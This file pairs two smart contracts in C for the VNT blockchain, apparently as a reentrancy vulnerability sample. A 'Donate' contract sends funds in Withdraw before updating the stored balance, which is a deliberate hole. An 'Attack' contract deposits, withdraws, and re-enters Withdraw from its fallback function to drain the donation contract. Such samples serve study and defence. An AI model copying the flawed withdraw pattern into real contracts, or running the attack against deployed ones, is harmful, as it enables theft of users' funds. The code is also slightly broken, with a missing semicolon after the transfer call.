#include "vntlib.h"

 
KEY mapping(address, uint) account;

constructor $Donate(){}

 
MUTABLE     
void $donate(){
    uint128 amount = GetValue();
    address from = GetSender();
    account.key = from;
    account.value = U256SafeAdd(account.value, amount);
}

 
UNMUTABLE
uint128 GetAmountFromAddress(address addr)
{
  account.key = addr;
  return account.value;
}

UNMUTABLE   
uint128 queryAmount(address to) {
    return GetAmountFromAddress(to);
}

 
MUTABLE
void Withdraw(uint128 amount){
    address from = GetSender();
    uint128 balance = account.value;
    Require(U256_Cmp(U256SafeSub(balance, amount), 0) != -1, "No enough money to withdraw");
    if(balance >= amount) {
        TransferFromContract(from, amount)
        account.key = from;
        account.value = U256SafeSub(account.value, amount);
    }
}


#include "vntlib.h"

KEY address owner;

constructor Attack(){
    owner = GetSender();
}

 
CALL void Withdraw(CallParams params, uint256 amount);
CallParams params1 = {Address("donate.c"), U256(10000), 1000};
CALL void $donate(CallParams params);
CallParams params2 = {Address("donate.c"), U256(10000), 1000};

MUTABLE     
void attack() {
    $donate(params2);
    Withdraw(params1, 10);
}

$_() {
    Withdraw(params1, 10);
}








